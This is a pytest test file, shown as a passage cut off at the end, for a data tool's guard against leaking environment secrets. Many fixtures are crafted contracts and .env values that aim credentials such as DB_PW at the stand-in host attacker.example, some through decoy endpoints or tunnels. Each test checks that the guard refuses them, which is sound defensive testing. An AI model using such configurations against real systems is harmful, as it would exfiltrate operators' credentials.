# Copyright 2025 Agentics Transformation Limited
# SPDX-License-Identifier: Apache-2.0

"""A ``{{ env.NAME }}`` in an acquisition build goes only where the operator paired it.

The acquisition dispatcher renders every placeholder from the operator's environment before a
runner starts. ``connection: {host: attacker.example, password: "{{ env.DB_PW }}"}`` would send
DB_PW to attacker.example, and a name cannot tell a secret from any other variable (DB_PW, PGPASS and
DATABASE_URL look like none). So the key is the destination, as ``secrets.policy`` judges it for a
``secretRef``: a variable in a source or a sink block renders only when every endpoint of that block
is this machine, a host written as one whole ``{{ env.* }}`` (the operator chose the address), or a
host the operator paired with it (``NAME@host`` in FLUID_ACQUISITION_SECRET_REF_ALLOWLIST). A host
variable counts as the operator's only while its value is theirs: one a project dotenv file supplied
(``ZZZ=attacker.example`` in ``.env``) is the project's choice, and is paired like a literal host.
"""

from __future__ import annotations

import argparse
import copy
import logging
import os
from pathlib import Path
from typing import Any, Callable, Dict, Iterator, List, Optional, Tuple

import pytest

from fluid_build.secrets.policy import ALLOWLIST_ENV as SECRET_REF_ALLOWLIST
from fluid_build.util.env_templates import (
    EnvTemplateError,
    check_env_pairing,
    check_host_templates,
)
from tests.build_runners.test_catalog_auth_sink import (
    _catalog,
    _dbz_contract,
    _dispatch,
    _dispatch_as_run_builds_does,
    _install_fake_server,
    _kc_contract,
    _props_path,
)

pytestmark = [pytest.mark.unit]

_PROBE = "synthvalue123"
_CATALOG_URI = "https://lakekeeper:8443/catalog"


@pytest.fixture(params=["kafka-connect", "debezium"])
def engine(
    request, tmp_path: Path, monkeypatch
) -> Tuple[Callable[..., Dict[str, Any]], Callable[[], str]]:
    """One acquisition engine with its server faked: ``(contract_for(), pushed())``. The operator
    pairs nothing unless a test says so."""
    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    if request.param == "kafka-connect":
        mock = request.getfixturevalue("kafka_connect_mock")

        def contract_for(location: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
            return _kc_contract(None, location=location or _catalog(_CATALOG_URI))

        return contract_for, lambda: repr(mock.connectors)
    recorder = _install_fake_server(monkeypatch)
    paths: List[Path] = []

    def dbz_contract_for(location: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        contract = _dbz_contract(None, location=location or _catalog(_CATALOG_URI))
        paths.append(_props_path(contract, tmp_path))
        return contract

    def pushed() -> str:
        return repr(recorder.calls) + "".join(p.read_text() for p in paths if p.exists())

    return dbz_contract_for, pushed


def _source(contract: Dict[str, Any]) -> Dict[str, Any]:
    return contract["builds"][0]["properties"]["source"]["connection"]


def _run(contract: Dict[str, Any], tmp_path: Path, shape: str) -> int:
    """The dispatcher as it is called: with a contract as written (``direct``), with the contract
    beside itself (``yaml``), and with a plan's contract, rendered, beside the one as written."""
    if shape == "direct":
        return _dispatch(contract, tmp_path)
    return _dispatch_as_run_builds_does(contract, tmp_path, plan=shape == "plan")


_SHAPES = pytest.mark.parametrize("shape", ["direct", "yaml", "plan"])
_NAMES = pytest.mark.parametrize(
    "name", ["AWS_SECRET_ACCESS_KEY", "DB_PW", "PGPASS", "DATABASE_URL", "RUN_DATE"]
)


@_SHAPES
@_NAMES
def test_a_variable_beside_a_host_the_contract_picks_is_refused_unpaired(
    engine, tmp_path: Path, monkeypatch, capsys, caplog, shape, name
):
    """The repro: any name, ``password: "{{ env.NAME }}"`` beside a literal remote host."""
    contract_for, pushed = engine
    monkeypatch.setenv(name, _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.%s }}" % name})

    with caplog.at_level(logging.DEBUG):
        rc = _run(contract, tmp_path, shape)

    shown = capsys.readouterr()
    everything = shown.out + shown.err + caplog.text
    assert rc == 1
    assert name in everything, "the refusal names the variable"
    assert "attacker.example" in everything, "and the host as the contract wrote it"
    assert "source.connection.host" in everything, "and its field"
    assert "FLUID_ACQUISITION_SECRET_REF_ALLOWLIST" in everything and f"{name}@" in everything
    assert _PROBE not in everything and _PROBE not in pushed(), "never the value"
    assert "attacker.example" not in pushed(), "nothing was started"


@_SHAPES
@_NAMES
def test_the_operator_pairs_a_variable_with_the_host(
    engine, tmp_path: Path, monkeypatch, shape, name
):
    contract_for, pushed = engine
    monkeypatch.setenv(name, _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.%s }}" % name})

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, f"{name}@elsewhere.example")
    assert _run(contract, tmp_path, shape) == 1, "a pairing with another host does not count"

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, f"{name}@attacker.example")
    assert _run(contract, tmp_path, shape) == 0
    assert "attacker.example" in pushed()


def test_a_variable_paired_with_no_host_goes_to_every_host(engine, tmp_path: Path, monkeypatch):
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.DB_PW }}"})
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")
    assert _dispatch(contract, tmp_path) == 0
    assert "attacker.example" in pushed()


@_SHAPES
def test_a_host_that_is_one_whole_variable_needs_no_pairing(
    engine, tmp_path: Path, monkeypatch, shape
):
    """The operator's variable makes the address; the contract only says which one."""
    contract_for, pushed = engine
    monkeypatch.setenv("PGHOST", "db.internal")
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update({"host": "{{ env.PGHOST }}", "password": "{{ env.DB_PW }}"})
    assert _run(contract, tmp_path, shape) == 0
    assert "db.internal" in pushed()


@_SHAPES
@pytest.mark.parametrize("host", ["localhost", "127.0.0.1", "::1"])
def test_a_loopback_host_needs_no_pairing(engine, tmp_path: Path, monkeypatch, shape, host):
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update({"host": host, "password": "{{ env.DB_PW }}"})
    assert _run(contract, tmp_path, shape) == 0
    assert host in pushed()


def test_a_decoy_host_does_not_cover_a_remote_one(engine, tmp_path: Path, monkeypatch, capsys):
    """Every endpoint of the block has to clear, so a whole-variable host (or a loopback one)
    beside a remote ``connection_string`` exempts nothing."""
    contract_for, pushed = engine
    monkeypatch.setenv("PGHOST", "db.internal")
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    _source(contract).update(
        {
            "host": "{{ env.PGHOST }}",
            "connection_string": "postgres://attacker.example/db",
            "password": "{{ env.DB_PW }}",
        }
    )
    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "DB_PW" in shown.out + shown.err and "attacker.example" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err + pushed()


def test_a_variable_in_the_catalog_settings_goes_with_the_catalog_host(
    engine, tmp_path: Path, monkeypatch, capsys
):
    """The sink's blocks: ``binding.location`` is sent to the catalog its ``uri`` names."""
    contract_for, pushed = engine
    monkeypatch.setenv("LAKE_WAREHOUSE", _PROBE)
    location = {**_catalog(_CATALOG_URI), "warehouse": "{{ env.LAKE_WAREHOUSE }}"}
    contract = contract_for(location)

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "LAKE_WAREHOUSE" in shown.out + shown.err and "lakekeeper" in shown.out + shown.err
    assert "exposes[0].binding.location.uri" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "LAKE_WAREHOUSE@lakekeeper")
    assert _dispatch(contract, tmp_path) == 0


def test_a_literal_endpoint_url_beside_a_variable_is_refused(
    engine, tmp_path: Path, monkeypatch, capsys
):
    """``endpoint_url`` is a host: an S3-compatible store the contract picks gets every variable
    its block names."""
    contract_for, pushed = engine
    monkeypatch.setenv("LAKE_BUCKET", _PROBE)
    location = {
        **_catalog(_CATALOG_URI),
        "bucket": "{{ env.LAKE_BUCKET }}",
        "endpoint_url": "https://s3.attacker.example",
    }
    contract = contract_for(location)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "LAKE_BUCKET@lakekeeper")

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "LAKE_BUCKET" in shown.out + shown.err
    assert "s3.attacker.example" in shown.out + shown.err
    assert "binding.location.endpoint_url" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()


def test_an_unset_variable_is_reported_as_unset_not_as_unpaired(
    engine, tmp_path: Path, monkeypatch, capsys
):
    contract_for, pushed = engine
    monkeypatch.delenv("DB_PW", raising=False)
    contract = contract_for()
    _source(contract).update({"host": "attacker.example", "password": "{{ env.DB_PW }}"})
    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "not set or empty" in shown.out + shown.err and "DB_PW" in shown.out + shown.err
    assert "paired" not in shown.out + shown.err


@_SHAPES
def test_a_variable_in_the_first_build_is_judged_when_another_build_runs(
    engine, tmp_path: Path, monkeypatch, capsys, shape
):
    """A runner reads ``builds[0]`` whichever build it runs, so every build is judged."""
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    first = contract["builds"][0]
    second = copy.deepcopy(first)
    second["id"] = "second"
    _source(contract).update({"host": "attacker.example", "password": "{{ env.DB_PW }}"})
    contract["builds"] = [first, second]

    from fluid_build.build_runners.base import _execute_acquisition_build

    rc = _execute_acquisition_build(second, contract, tmp_path, dry_run=False, as_written=contract)
    shown = capsys.readouterr()
    assert rc == 1 and "builds[0]" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()


# ── the check itself ─────────────────────────────────────────────────────────


def _contract(**source: Any) -> Dict[str, Any]:
    contract = _kc_contract(None, location=_catalog(_CATALOG_URI))
    _source(contract).update(source)
    return contract


@pytest.fixture(autouse=True)
def _no_operator_pairing(monkeypatch):
    from fluid_build.credentials.dotenv_store import reset_dotenv_load_log

    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    monkeypatch.setenv("DB_PW", _PROBE)
    reset_dotenv_load_log()  # what an earlier test's project files exported is not this test's
    yield
    reset_dotenv_load_log()


def test_the_refusal_is_typed_and_says_what_to_do():
    contract = _contract(host="attacker.example", password="{{ env.DB_PW }}")
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract, stage="fluid apply")
    error = info.value
    assert error.code == "EnvTemplateHostError"
    assert error.extras["reason"] == "unpaired" and error.extras["variable"] == "DB_PW"
    assert error.where == "builds[0].properties.source.connection.password"
    assert error.extras["entry"] == "DB_PW@attacker.example"
    assert "DB_PW@attacker.example" in error.fix and "secretRef" not in error.fix
    assert _PROBE not in repr(error.__dict__)


def test_a_block_that_names_no_endpoint_has_nothing_to_judge():
    """The engine's own configuration decides where it connects, as the policy's object-store gap."""
    check_env_pairing(_contract_without_a_host())
    contract = _kc_contract(None, location={"bucket": "{{ env.DB_PW }}", "format": "iceberg"})
    contract["builds"][0]["properties"].pop("source")
    check_env_pairing(contract)


def _contract_without_a_host() -> Dict[str, Any]:
    contract = _contract(password="{{ env.DB_PW }}")
    _source(contract).pop("host")
    return contract


def test_a_blank_endpoint_is_refused():
    """A field that is present and names no host is one the client picks itself: fail closed."""
    for host in ("", "   ", None):
        with pytest.raises(EnvTemplateError):
            check_env_pairing(_contract(host=host, password="{{ env.DB_PW }}"))


def test_an_object_store_endpoint_is_not_a_host():
    contract = _contract(uri="s3://a-bucket/prefix", password="{{ env.DB_PW }}")
    _source(contract).pop("host")
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "field, value",
    [
        ("connection_string", "host=attacker.example dbname=x"),
        ("connection_string", "Server=attacker.example;Database=x"),
        ("uri", "postgres://attacker.example:5432/db"),
        ("sqlalchemy_url", "postgresql://attacker.example/db"),
        ("jdbc_url_params", "host=attacker.example"),
        ("host", "primary.example,attacker.example"),
        ("ssh_tunnel", {"enable": True, "host": "bastion.attacker.example"}),
        ("account", "attacker-account"),
    ],
)
def test_every_endpoint_the_policy_reads_counts(field: str, value: Any):
    """Keyword strings, query strings, host lists and tunnels: read by ``secrets.policy``, not here."""
    source: Dict[str, Any] = {field: value, "password": "{{ env.DB_PW }}"}
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update(source)
    if field == "account":
        _source(contract)["host"] = "acme.snowflakecomputing.com"
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["reason"] == "unpaired"


def test_a_keyword_string_is_paired_for_any_host_or_not_at_all(monkeypatch):
    contract = _contract(connection_string="host=attacker.example dbname=x")
    _source(contract).pop("host")
    _source(contract)["password"] = "{{ env.DB_PW }}"
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@attacker.example")
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)  # the policy reads no host out of a keyword string
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")
    check_env_pairing(contract)


@pytest.mark.parametrize("outputs", [["data"], ["nonexistent"], [], "data", None])
def test_every_expose_is_judged_whatever_outputs_names(outputs):
    """Runners pick their own expose (``exposes[0]`` for dlt, airbyte and meltano; the first Iceberg
    one for the Kafka Connect and Debezium sinks), so ``outputs`` is no promise of what is written.
    """
    contract = _airbyte_contract(
        {"host": "localhost"},
        exposes=[
            {
                "exposeId": "decoy",
                "binding": {
                    "location": {"host": "attacker.example", "password": "{{ env.DB_PW }}"}
                },
            },
            {"exposeId": "data", "binding": {"location": {"path": "./out/x.parquet"}}},
        ],
    )
    contract["builds"][0]["outputs"] = outputs
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.where == "exposes[0].binding.location.password"


def test_a_variable_in_one_expose_goes_with_the_catalog_of_another():
    contract = _kc_contract(None, location=_catalog(_CATALOG_URI))
    contract["builds"][0]["properties"].pop("source")
    other = copy.deepcopy(contract["exposes"][0])
    other["exposeId"] = "elsewhere"
    other["binding"]["location"]["warehouse"] = "{{ env.DB_PW }}"
    contract["exposes"].append(other)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.where == "exposes[1].binding.location.warehouse"
    assert "host 'lakekeeper'" in info.value.what


def test_a_variable_in_the_sink_block_goes_with_the_catalog_the_location_names():
    contract = _kc_contract(None, location=_catalog(_CATALOG_URI))
    contract["builds"][0]["properties"].pop("source")
    contract["builds"][0]["properties"]["sink"]["catalogAuth"] = {
        "type": "bearer",
        "token": "{{ env.DB_PW }}",
    }
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.where == "builds[0].properties.sink.catalogAuth.token"
    assert "lakekeeper" in info.value.what


def test_one_build_on_its_own_is_read_too():
    contract = _contract(host="attacker.example", password="{{ env.DB_PW }}")
    with pytest.raises(EnvTemplateError):
        check_env_pairing({"build": contract["builds"][0]})


def test_nothing_to_judge_in_what_is_not_a_contract():
    for value in (None, [], "x", {"builds": "no"}, {"builds": [None, 3]}, {"build": {"id": "x"}}):
        check_env_pairing(value)


# ── what the reviews found ───────────────────────────────────────────────────


def _airbyte_contract(connection: Dict[str, Any], *, exposes: Optional[List[Any]] = None):
    return {
        "builds": [
            {
                "id": "b",
                "engine": "airbyte",
                "outputs": ["data"],
                "properties": {"source": {"kind": "postgres", "connection": connection}},
            }
        ],
        "exposes": exposes
        or [{"exposeId": "data", "binding": {"location": {"path": "./out/x.parquet"}}}],
    }


@pytest.mark.parametrize(
    "connection",
    [
        {"host": "attacker.example"},
        {"host": "attacker.example:5432"},
        {"uri": "postgres://u:{{ env.DB_PW }}@attacker.example:5432/db"},
        {"connection_string": "postgres://attacker.example/db?sslmode={{ env.DB_PW }}"},
    ],
)
def test_the_entry_the_refusal_suggests_clears_it(connection, monkeypatch):
    """The text names the host as the contract wrote it, and the entry it suggests is the one the
    policy matches (a bare ``host`` field keeps its port; a URI's does not count)."""
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update({**connection, "password": "{{ env.DB_PW }}"})
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    error = info.value
    assert "attacker.example" in error.what and "{{" not in error.what.split("}}", 1)[1]
    assert "secretRef" not in error.fix
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, error.extras["entry"])
    check_env_pairing(contract)


def test_a_variable_in_a_urls_password_does_not_hide_its_literal_host():
    contract = _contract()
    _source(contract).pop("host")
    _source(contract)["uri"] = "postgres://u:{{ env.DB_PW }}@attacker.example/db"
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert "host 'attacker.example'" in info.value.what


@pytest.mark.parametrize(
    "host",
    [
        "{{ env.H }}:5432",
        "{{ env.U }}@{{ env.H }}",
        "{{ env.U }}:{{ env.P }}@{{ env.H }}:5432",
    ],
)
def test_a_whole_variable_host_keeps_its_port_and_userinfo(host, monkeypatch):
    """A bare ``host`` field is read whole by the policy; the host part is still the operator's."""
    for name, value in {"H": "db.internal", "U": "u", "P": "5432"}.items():
        monkeypatch.setenv(name, value)
    check_env_pairing(_contract(host=host, password="{{ env.DB_PW }}"))


def test_a_tunnel_through_the_operators_own_bastion_needs_no_pairing(monkeypatch):
    monkeypatch.setenv("H", "db.internal")
    monkeypatch.setenv("B", "bastion.internal")
    check_env_pairing(
        _contract(
            host="{{ env.H }}",
            ssh_tunnel={"enable": True, "host": "{{ env.B }}"},
            password="{{ env.DB_PW }}",
        )
    )


def test_a_tunnel_through_a_host_the_contract_picks_is_refused_by_name():
    contract = _contract(
        host="{{ env.DB_PW }}",
        ssh_tunnel={"enable": True, "host": "bastion.attacker.example"},
    )
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert "bastion.attacker.example" in info.value.what
    assert "ssh_tunnel.host" in info.value.what


@pytest.mark.parametrize(
    "field, value",
    [("endpoint", "/v1/users"), ("uri", "/data/in.csv"), ("host", "/var/run/postgresql")],
)
def test_a_path_names_no_host(field, value):
    """A REST ``endpoint: /v1/users``, a file ``uri``, a socket directory: nothing to pair with."""
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update({field: value, "token": "{{ env.DB_PW }}"})
    check_env_pairing(contract)


def test_a_scheme_relative_uri_is_still_a_host():
    contract = _contract()
    _source(contract).pop("host")
    _source(contract).update({"uri": "//attacker.example/x", "token": "{{ env.DB_PW }}"})
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)


@pytest.mark.parametrize(
    "exposes, outputs",
    [
        ([{"id": ["x"], "binding": {"location": {"host": "a.example"}}}], ["x"]),
        ([{"exposeId": None, "id": "x", "binding": {"location": {"host": "a.example"}}}], ["x"]),
        ([{"exposeId": "x", "binding": {"location": {"host": "a.example"}}}], "abc"),
        ([{"exposeId": 3, "binding": []}, None, "x"], None),
    ],
)
def test_odd_shapes_never_raise_anything_but_a_refusal(exposes, outputs):
    """A contract with no placeholder in it must reach the dispatcher's own checks unchanged."""
    contract = {"builds": [{"outputs": outputs, "properties": {}}], "exposes": exposes}
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "key, value",
    [
        ("bootstrap_servers", "attacker.example:9092"),
        ("brokers", ["a.example:9092", "attacker.example:9092"]),
        ("db_host", "a.example"),
        ("HOST", "a.example"),
        ("Host", "a.example"),
        ("address", "a.example"),
        ("account", "acme-org"),
        ("server_hostname", "a.example"),
    ],
)
def test_an_address_the_policy_does_not_read_needs_an_entry_for_any_host(key, value, monkeypatch):
    """A pass-through connector may take its host from a field the policy has no name for. The
    policy refuses a ``secretRef`` in a block that names no host it can read; so does this."""
    contract = _airbyte_contract({key: value, "password": "{{ env.DB_PW }}"})
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert key in info.value.what and "any host" in info.value.fix
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@a.example")
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)  # an entry for one host reads no host out of this field
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "connection",
    [
        {"brokers": "{{ env.BROKERS }}"},  # the operator's own address
        {"kind": "csv", "path": "{{ env.DIR }}/in.csv"},  # a local file names no host
        {"bucket_url": "s3://a-bucket/prefix"},  # a store
        {"endpoint_url": "/v1/data"},  # a path
        {"account_id": "123456789012"},  # not an address
        {"db_host": ""},  # names nothing
        {"db_host": None},
    ],
)
def test_what_is_not_an_address_is_not_judged_as_one(connection, monkeypatch):
    monkeypatch.setenv("BROKERS", "kafka.internal:9092")
    monkeypatch.setenv("DIR", "/data")
    check_env_pairing(_airbyte_contract({**connection, "password": "{{ env.DB_PW }}"}))


def test_a_variable_of_blanks_does_not_switch_the_check_off(monkeypatch):
    """The build's render keeps a value of blanks, so the check reads it as a value too: an
    endpoint that names one is judged, and nothing else in the block escapes with it."""
    monkeypatch.setenv("BLANKVAR", "  ")
    contract = _contract(
        host="attacker.example",
        uri="postgres://attacker.example:5432/db{{ env.BLANKVAR }}",
        password="{{ env.DB_PW }}",
    )
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)


def test_a_variable_of_blanks_in_a_host_does_not_hide_its_neighbour(monkeypatch):
    monkeypatch.setenv("BLANK", "  ")
    with pytest.raises(EnvTemplateError) as info:
        check_host_templates({"host": "{{ env.BLANK }}{{ env.DB_PW }}.attacker.example"})
    assert info.value.extras["reason"] == "unpaired"


# ── the pass-through engines, through the dispatcher ─────────────────────────


def _fake_airbyte(monkeypatch) -> List[Any]:
    """Stand in for the Airbyte runner and record what it is handed."""
    import fluid_build.build_runners.airbyte.runner as runner

    calls: List[Any] = []

    def fake(build, contract, contract_dir, *, dry_run, sample_rows=None):
        calls.append(build)
        return 0

    monkeypatch.setattr(runner, "execute_airbyte_build", fake)
    return calls


def test_a_broker_the_contract_picks_gets_no_variable_through_a_pass_through_engine(
    tmp_path: Path, monkeypatch, capsys
):
    from fluid_build.build_runners.base import _execute_acquisition_build

    calls = _fake_airbyte(monkeypatch)
    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
    monkeypatch.setenv("KAFKA_PW", _PROBE)
    jaas = 'PlainLoginModule required username="u" password="{{ env.KAFKA_PW }}";'
    contract = _airbyte_contract(
        {"bootstrap_servers": "attacker.example:9092", "protocol": {"sasl_jaas_config": jaas}}
    )

    assert _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False) == 1
    shown = capsys.readouterr()
    assert calls == [], "the connector was never started"
    assert "KAFKA_PW" in shown.out + shown.err and _PROBE not in shown.out + shown.err

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "KAFKA_PW")
    assert _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False) == 0
    assert _PROBE in repr(calls), "once the operator allows it, the value is rendered"


def test_a_decoy_expose_ahead_of_the_output_is_judged(engine, tmp_path: Path, monkeypatch, capsys):
    """The Kafka Connect and Debezium sinks read the first Iceberg expose; ``outputs`` names another."""
    contract_for, pushed = engine
    monkeypatch.setenv("DB_PW", _PROBE)
    contract = contract_for()
    decoy = copy.deepcopy(contract["exposes"][0])
    decoy["exposeId"] = "decoy"
    decoy["binding"]["location"].update(
        {"uri": "https://catalog.attacker.example/catalog", "warehouse": "{{ env.DB_PW }}"}
    )
    contract["exposes"].insert(0, decoy)

    assert _dispatch(contract, tmp_path) == 1
    shown = capsys.readouterr()
    assert "catalog.attacker.example" in shown.out + shown.err
    assert _PROBE not in shown.out + shown.err and _PROBE not in pushed()
    assert "attacker.example" not in pushed()


# ── a host variable a project dotenv file supplies is the project's choice ───
#
# ``fluid apply`` loads the project's ``.env`` before it renders anything, and that file may set any
# name that is not on the credential policy's list. ``ZZZ=attacker.example`` in it, beside the
# contract's ``host: "{{ env.ZZZ }}"``, made the host look like the operator's own choice (the
# whole-variable exemption) and the operator's DB_PW went to attacker.example with exit 0. The
# project ships the contract too, so the exemption holds only while the value is the operator's:
# from the shell, the CI environment or ``FLUID_SECRETS_FILE``.


@pytest.fixture
def project(tmp_path: Path, monkeypatch) -> Iterator[Path]:
    """The project directory (``tmp_path``, where the dispatcher runs too). A test writes its
    ``.env`` and hydrates it with the real ``hydrate_dotenv``; what the store exported leaves with
    the test."""
    from fluid_build.credentials.dotenv_store import reset_dotenv_load_log

    monkeypatch.delenv("FLUID_SECRETS_FILE", raising=False)
    monkeypatch.delenv("FLUID_ENV", raising=False)
    reset_dotenv_load_log()
    before = set(os.environ)
    yield tmp_path
    for name in set(os.environ) - before:
        del os.environ[name]
    reset_dotenv_load_log()


def _dotenv(project: Path, text: str) -> None:
    env_file = project / ".env"
    env_file.write_text(text, encoding="utf-8")
    env_file.chmod(0o600)


def _hydrate(project: Path, text: str) -> None:
    """Write the project's ``.env`` and load it as ``fluid apply`` does."""
    from fluid_build.cli._common import hydrate_dotenv

    _dotenv(project, text)
    hydrate_dotenv(project)


def _picks_the_host(contract: Dict[str, Any]) -> Dict[str, Any]:
    _source(contract).update({"host": "{{ env.ZZZ }}", "password": "{{ env.DB_PW }}"})
    return contract


@_SHAPES
def test_a_host_variable_a_project_dotenv_supplies_is_the_projects_choice(
    engine, project: Path, capsys, caplog, shape
):
    """The probe: the project's ``.env`` names the host, the operator's own DB_PW goes with it."""
    contract_for, pushed = engine
    _hydrate(project, "ZZZ=attacker.example\n")
    assert os.environ["ZZZ"] == "attacker.example", "the store exported it, as apply's does"
    contract = _picks_the_host(contract_for())

    with caplog.at_level(logging.DEBUG):
        rc = _run(contract, project, shape)

    shown = capsys.readouterr()
    everything = shown.out + shown.err + caplog.text
    assert rc == 1
    assert "ZZZ" in everything and "project dotenv" in everything
    assert "source.connection.host" in everything, "and its field"
    assert "attacker.example" not in everything + pushed(), "neither printed nor started"
    assert _PROBE not in everything + pushed()


@_SHAPES
def test_pairing_the_project_supplied_host_does_not_pair_what_goes_to_it(
    engine, project: Path, monkeypatch, capsys, shape
):
    contract_for, pushed = engine
    _hydrate(project, "ZZZ=attacker.example\n")
    contract = _picks_the_host(contract_for())

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example")
    assert _run(contract, project, shape) == 1
    shown = capsys.readouterr()
    text = shown.out + shown.err
    assert "DB_PW" in text and "ZZZ" in text and "DB_PW@" in text
    assert _PROBE not in text + pushed() and "attacker.example" not in pushed()

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example,DB_PW@attacker.example")
    assert _run(contract, project, shape) == 0, "the operator decides, with both entries"
    assert "attacker.example" in pushed()


@_SHAPES
def test_a_secret_reference_beside_a_project_supplied_host_is_judged_on_the_rendered_host(
    engine, project: Path, monkeypatch, shape
):
    """The other way a contract sends a secret: ``secretRef`` is judged by the secret policy on the
    host the contract renders to, which is the project's here. The project's file never opened it,
    and pairing the host variable alone does not pair the secret."""
    from fluid_build.secrets.policy import AcquisitionSecretPolicyError
    from fluid_build.secrets.run import secret_run

    contract_for, pushed = engine
    _hydrate(project, "ZZZ=attacker.example\n")
    contract = contract_for()
    _source(contract).pop("password", None)
    _source(contract).update(
        {"host": "{{ env.ZZZ }}", "secretRef": "env://DB_PW"}  # pragma: allowlist secret
    )

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example")
    with secret_run("apply"), pytest.raises(AcquisitionSecretPolicyError) as info:
        _run(contract, project, shape)
    assert "DB_PW" in str(info.value) and _PROBE not in str(info.value)
    assert "attacker.example" not in pushed() and _PROBE not in pushed()

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example,DB_PW@attacker.example")
    with secret_run("apply"):
        assert _run(contract, project, shape) == 0, "the operator decides, with both entries"


@_SHAPES
def test_a_host_variable_the_operator_exports_stays_theirs(
    engine, project: Path, monkeypatch, shape
):
    """The project's file does not replace a value the operator holds: the shell's value is the
    one in effect, and the exemption holds."""
    contract_for, pushed = engine
    monkeypatch.setenv("ZZZ", "db.internal")
    _hydrate(project, "ZZZ=attacker.example\n")
    assert os.environ["ZZZ"] == "db.internal"
    contract = _picks_the_host(contract_for())

    assert _run(contract, project, shape) == 0
    assert "db.internal" in pushed() and "attacker.example" not in pushed()


@_SHAPES
def test_a_host_variable_from_the_operators_secrets_file_stays_theirs(
    engine, project: Path, monkeypatch, shape
):
    """``FLUID_SECRETS_FILE`` loads after the project's files and wins: the operator's file."""
    contract_for, pushed = engine
    secrets = project / "operator" / "secrets.env"
    secrets.parent.mkdir()
    secrets.write_text("ZZZ=db.internal\n", encoding="utf-8")
    monkeypatch.setenv("FLUID_SECRETS_FILE", str(secrets))
    _hydrate(project, "ZZZ=attacker.example\n")
    assert os.environ["ZZZ"] == "db.internal"
    contract = _picks_the_host(contract_for())

    assert _run(contract, project, shape) == 0
    assert "db.internal" in pushed() and "attacker.example" not in pushed()


@pytest.mark.parametrize("host", ["localhost", "127.0.0.1"])
def test_a_project_dotenv_that_points_at_this_machine_needs_no_pairing(
    engine, project: Path, tmp_path: Path, host
):
    """A developer's ``.env`` with ``DB_HOST=localhost`` is the common case; nothing leaves."""
    contract_for, pushed = engine
    _hydrate(project, f"ZZZ={host}\n")
    assert _run(_picks_the_host(contract_for()), project, "direct") == 0
    assert host in pushed()


def test_the_record_tells_the_projects_value_from_the_operators(project: Path, monkeypatch):
    """What the check reads: the store records the names it exported from the project's files, and
    leaves out a name the shell or ``FLUID_SECRETS_FILE`` already held."""
    from fluid_build.credentials.dotenv_store import project_value_in_effect

    secrets = project / "operator" / "secrets.env"
    secrets.parent.mkdir()
    secrets.write_text("FROM_OPERATOR_FILE=db.opsfile.example\n", encoding="utf-8")
    monkeypatch.setenv("FLUID_SECRETS_FILE", str(secrets))
    monkeypatch.setenv("FROM_SHELL", "db.shell.example")
    monkeypatch.delenv("FROM_PROJECT", raising=False)
    _hydrate(
        project,
